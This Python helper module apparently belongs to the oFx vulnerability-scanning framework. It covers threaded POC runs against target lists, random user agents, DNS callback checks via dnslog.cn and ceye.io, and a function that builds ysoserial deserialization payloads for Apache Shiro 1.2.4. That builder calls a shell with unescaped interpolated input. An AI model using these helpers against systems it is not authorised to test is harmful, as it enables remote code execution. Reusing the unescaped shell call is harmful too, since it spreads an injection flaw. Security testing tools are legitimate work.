# coding:utf-8
from __future__ import print_function
from logging import fatal
from typing import Text
from bs4 import BeautifulSoup
import sys
import string
import argparse
from urllib.parse import urlparse

import random
import configparser
import requests
import time
import os
import re
import base64
import binascii
import subprocess
import uuid
from Crypto.Cipher import AES

from lib.core.data import vulnoutput, unvulnoutput, unreachoutput, lock, AliveList, root_path, yso_path, \
    yso_tmpfile_path, dnslog_cn_session
from lib.core.log import logverifyerror, logvuln, logunvuln

from requests.exceptions import ConnectTimeout
from requests.exceptions import ConnectionError
from requests.exceptions import HTTPError
from requests.exceptions import TooManyRedirects


def get_title(htmlcode):
    """
    获取网站title  

    use:
    get_title(html_source)  

    return:  
    title  
    """
    soup = BeautifulSoup(htmlcode, 'html.parser')

    end = str(soup.title).find("</title>")
    title = str(soup.title)[7:end] + "<title>"
    if "<title>" in title:
        title = title.replace("<title>", "", 10000)

    if "|" in title:
        title = title.replace("|", " ", 100000)

    if "\n" in title:
        title = title.replace("\n", "", 100000)

    if "\t" in title:
        title = title.replace("\t", "", 100000)

    if "\r" in title:
        title = title.replace("\r", "", 100000)

    if "`" in title:
        title = title.replace("`", "", 100000)

    if "," in title:
        title = title.replace(",", "", 100000)

    return title


def url_handle(url):
    """
    url处理函数  

    return:
    dict urldict  
    """

    if url.startswith("http"):
        p = urlparse(url)
        # pass

    else:
        url = "http://" + url
        p = urlparse(url)
        if ":" in p.netloc:
            if "443" in p.netloc.split(":")[1]:
                url = url.replace("http://", "https://")
                p = urlparse(url)

            else:
                pass
        else:
            pass

    return p.scheme + "://" + p.netloc


def get_random_ua():
    with open("./data/user_agents.txt", "r") as f:
        UAs = [i.strip() for i in f.readlines()]
    return random.choice(UAs)


def random_str(length=10, chars="str int"):
    charlist = ""
    if "str" in chars:
        charlist += string.ascii_letters
    if "int" in chars:
        charlist += string.digits
    return ''.join(random.sample(charlist, length))


def gen_title(string):
    return "<title>" + string + "</title>"


def get_local_version(path):
    cp = configparser.ConfigParser()
    cp.read(path)
    return cp["info"]["version"]


session = dnslog_cn_session
_dnslogCN_flag = ""


def get_dnslogCN():
    global session, _dnslogCN_flag
    flag = random_str()
    if len(_dnslogCN_flag) == 0:
        try:
            req = session.get("http://www.dnslog.cn/getdomain.php?t=0.", timeout=50)
            _dnslogCN_flag = flag = req.text
            return True, random_str() + "." + _dnslogCN_flag
        except:
            return False, ""
    else:
        return True, random_str() + "." + _dnslogCN_flag


def check_dnslogCN(flag):
    global session
    time.sleep(random.randint(10, 15))
    req = session.get("http://www.dnslog.cn/getrecords.php?t=0.", timeout=50)
    if flag.lower() in req.text.lower():
        return True
    else:
        return False


def get_ceye_dns():
    """
    根据你配置的dns，生成一个随机dns子域名  
    该函数会检查info.ini配置是否正确，并通过ture/false来反馈给调用者  
    如果配置读取失败会立即停止本次扫描并将错误信息打印到控制台提示用户  
    
    Returns:
        [type]: [description]
    """
    cp = configparser.ConfigParser()
    cp.read(root_path + "/lib/ceye.ini")
    dns = cp["ceye"]["dns"]
    token = cp["ceye"]["token"]
    flag = random_str()

    if len(dns) == 0 or len(token) == 0:
        return False, "<title>ceye dns或token 配置为空，请重新确认</title>"
    else:
        return True, flag + "." + dns


def verify_ceye_dns(flag):
    """
    接通ceye的dns的api  
    内置sleep功能，必须在3秒以上，否则极其不稳定，考虑到批量扫描时对ceye的负载，我决定最少延时6秒   

    Args:
        flag ([type]): [description]

    Returns:
        [type]: [description]
    """
    cp = configparser.ConfigParser()
    cp.read(root_path + "/lib/ceye.ini")
    token = cp["ceye"]["token"]
    api_url = "http://api.ceye.io/v1/records?token=" + token + "&type=dns"

    time.sleep(random.randint(10, 15))

    req = requests.get(api_url, timeout=50)
    if "User Not Exists" in req.text:
        return "<title>ceye 配置错误，无法获取数据</title>"
    elif flag.lower() in req.text.lower():
        return True
    else:
        return False


def get_latest_revision():
    lv = None
    cp = configparser.ConfigParser()
    try:
        req = requests.get("https://raw.githubusercontent.com/bigblackhat/oFx/master/info.ini", timeout=15)
        cp.read_string(req.text)

        lv = cp["info"]["version"]
    except Exception:
        pass
    return lv


def run(POC_Class, target, proxy=False, output=True, PocRemain="", Alive_mode=False):
    global vulnoutput, unvulnoutput, unreachoutput, AliveList
    while not target.empty():

        try:
            target_url = target.get()
            rVerify = POC_Class(target_url, proxy)
            poc_name = rVerify._info["name"]
            # print(poc_name)
            vuln = rVerify._verify()

            if Alive_mode == True:
                if vuln[0] == True:
                    AliveList.add(target_url)
                    continue
                    # print("yes")

                else:
                    continue
            if vuln[0] == True:
                try:
                    vulntitle = get_title(vuln[1])
                except:
                    vulntitle = ""
                lock.acquire()
                logvuln("POC 剩余 : %s ╭☞ Target 剩余 : %d Vuln %s | WebSite Title：%s " % (
                    PocRemain, target.qsize(), target_url, vulntitle))
                # logvuln("%s ╭☞ %d Vuln %s | WebSite Title：%s | Server Response : %s"%(PocRemain,target.qsize(),target_url,vulntitle,vuln[1]))
                if poc_name in vulnoutput:
                    vulnoutput[poc_name].append(target_url + " || " + vulntitle)
                else:
                    vulnoutput.update({poc_name: list()})
                    vulnoutput[poc_name].append(target_url + " || " + vulntitle)
                lock.release()
            else:
                lock.acquire()
                logunvuln("POC 剩余 : %s ╭☞ Target 剩余 : %d UnVuln %s " % (PocRemain, target.qsize(), target_url))
                unvulnoutput.append(target_url)
                lock.release()

        except NotImplementedError as e:
            lock.acquire()
            logverifyerror(
                "POC 剩余 : %s ╭☞ %d The POC does not support virtualized depiction scan mode  Error details：%s " % (
                    PocRemain, target.qsize(), str(e)))
            unreachoutput.append(target_url + " || Error details" + str(e))
            lock.release()
            pass

        except TimeoutError as e:
            lock.acquire()
            logverifyerror("POC 剩余 : %s ╭☞ %d Connection timed out %s Error details：%s " % (
                PocRemain, target.qsize(), target, str(e)))
            unreachoutput.append(target_url + " || Error details" + str(e))
            lock.release()
            pass

        except HTTPError as e:
            lock.acquire()
            logverifyerror("POC 剩余 : %s ╭☞ %d HTTPError occurred %s Error details：%s " % (
                PocRemain, target.qsize(), target, str(e)))
            unreachoutput.append(target_url + " || Error details" + str(e))
            lock.release()
            pass

        except ConnectionError as e:
            lock.acquire()
            logverifyerror(
                "POC 剩余 : %s ╭☞ %d Connection error %s Error details：%s " % (PocRemain, target.qsize(), target, str(e)))
            unreachoutput.append(target_url + " || Error details" + str(e))
            lock.release()
            pass

        except TooManyRedirects as e:
            lock.acquire()
            logverifyerror(
                "POC 剩余 : %s ╭☞ %d The number of resets exceeds the limit, and the goal is discarded %s Error details：%s " % (
                    PocRemain, target.qsize(), target, str(e)))
            unreachoutput.append(target_url + " || Error details" + str(e))
            lock.release()
            pass

        except BaseException as e:
            lock.acquire()
            logverifyerror(
                "POC 剩余 : %s ╭☞ %d unknown mistake %s Error details：%s " % (PocRemain, target.qsize(), target, str(e)))
            unreachoutput.append(target_url + " || Error details" + str(e))
            lock.release()
            pass


def GetCommand():
    parser = argparse.ArgumentParser(description="oFx Framewark of POC Test",
                                     usage="python3 ofx.py -f [target_path] / -u [url]   -s [poc_path]  --thread 50\n\
       python3 ofx.py --fofa-search")

    searchengine = parser.add_argument_group("SearchEngine")
    searchengine.add_argument("--fofa-search", action="store_true", help="Fofa Search模式，该参数不需要跟值")

    # target = parser.add_argument_group("TARGET")
    target = parser.add_mutually_exclusive_group()
    target.add_argument("-u", "--url", type=str, help="指定单个url，该模式不支持多POC或全量POC (e.g. www.baidu.com)")
    target.add_argument("-f", "--file", type=str, help="指定存有url列表的文件路径，该模式支持多POC或全量POC (e.g. /root/urllist.txt)")

    script = parser.add_argument_group("Script")
    script.add_argument("-s", "--script", type=str,
                        help="指定POC相对路径，格式见readme.md (e.g. -s poc/jellyfin/jellyfin_fileread_scan/poc.py OR -s all)")

    system = parser.add_argument_group("System")
    system.add_argument("--thread", default=10, type=int, help="指定线程数，默认为10，仅扫描时指定线程数有效")
    system.add_argument("--proxy", default=False,
                        help="指定Http Proxy，仅扫描时指定线程数有效，Example：127.0.0.1:8080 OR http://127.0.0.1:8080")
    system.add_argument("--output", default=True, help="不建议使用该参数指定输出地址，建议扫完了看output目录即可")
    system.add_argument("--sound", action="store_true", help="扫完了会有铃声提醒，不推荐使用该参数")
    system.add_argument("--version", action="store_true", help="显示本地oFx版本，并根据网络状态给出最新版本号")

    developer = parser.add_argument_group("Developer(POC开发者工具箱)")
    developer.add_argument("--add-poc", action="store_true", help="生成POC标准目录结构，该参数不需要跟值")
    developer.add_argument("--show-error", action="store_true", help="single mode下展示详细报错信息")
    if len(sys.argv) == 1:
        sys.argv.append("-h")
    args = parser.parse_args()
    return args


def Str2Base64(string):
    """
    str => base64
    """
    return base64.b64encode(str.encode(string)).decode()


def Base642Str(string):
    """
    base64 => str
    """
    return base64.b64decode(string).decode()


def Str2Hex(string):
    """
    字符串转hex函数，会自动为hex加上0x前缀
    举例：传进的字符串是：IQumeM4xcO，将会返回0x4951756d654d3478634f
    """
    return "0x" + binascii.hexlify(string.encode("utf-8")).decode("utf-8")


def Hex2Str(string):
    """
    hex转字符串函数，会自动的识别hex是否带有0x前缀，如果有则会去掉这段子字符串，调用者不必费心处理
    举例：不论传进来的是0x4951756d654d3478634f还是4951756d654d3478634f，都将会返回其转换后的字符串：IQumeM4xcO
    """
    if string[:2] == "0x":
        string = string[2:]
    return binascii.unhexlify(string.encode("utf-8")).decode("utf-8")


def re_search_content(reg, content):
    return re.search(reg, content)[0]


def crypt_AES_CBC(filepath, key):
    """
    将文件内容做AES CBC加密，key由调用者提供，加密内容会做一次base64编码再输出。
    """
    f = open(filepath, 'rb')
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = base64.b64decode(key)
    iv = uuid.uuid4().bytes
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    file_body = pad(f.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext


def get_shiro_payload_from_yso(gadget, command, key=""):
    """
    动态生成shiro124的payload，因为内置了aes加密步骤，所以是shiro专属的函数。
    """
    save_path = yso_tmpfile_path + random_str(10, "str")
    cmd_tmp = "java -jar {yso_path} {gadget} \"{command}\" > {save_path}".format(yso_path=yso_path, gadget=gadget,
                                                                                 command=command, save_path=save_path)
    process = subprocess.call(cmd_tmp, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    # process = subprocess.Popen(cmd_tmp, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    # time.sleep(0.5)
    crpto_content = crypt_AES_CBC(save_path, key)
    os.remove(save_path)
    return crpto_content.decode()
